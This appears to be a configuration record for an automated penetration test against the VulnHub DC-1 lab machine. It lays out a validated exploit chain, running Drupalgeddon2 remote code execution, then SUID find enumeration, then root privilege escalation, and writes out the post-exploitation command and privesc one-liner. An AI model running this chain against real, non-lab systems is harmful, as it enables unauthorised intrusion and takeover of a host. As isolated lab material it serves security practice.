name: VulnHub-DC-1-fullchain

local_exec.note: Drupalgeddon2 2-step RCE via stage2/payloads/drupalgeddon2.sh <url> <cmd>; the executor strips the host HTTP proxy.

isolation_note: VulnHub DC-1 VM on isolated VMnet2 (192.168.52.130), host-only, no internet egress. Owned disposable lab; vm_reset reverts to 'clean'. Drupalgeddon2 RCE is stateless (no persistent write) and SUID-find privesc reads only -> effectively non-mutating, but reset is available.

eta_recipes.post_exploitation: bash stage2/payloads/drupalgeddon2.sh http://192.168.52.130 "sudo -l 2>/dev/null; find / -perm -4000 -type f -exec ls -l {} \;"

rationale: DC-1 full chain (VALIDATED LIVE 2026-06-21): Drupal 7.24 Drupalgeddon2 (CVE-2018-7600, canonical 2-step user/password->file/ajax via the helper) -> www-data (id) -> SUID find enumeration -> privesc `find /etc/passwd -exec id ;` returns euid=0(root) -> root. Goal = reached_root (euid=0). Webshell transport (curl, executor strips the Clash proxy). Cleanest of the 4; the proven template.
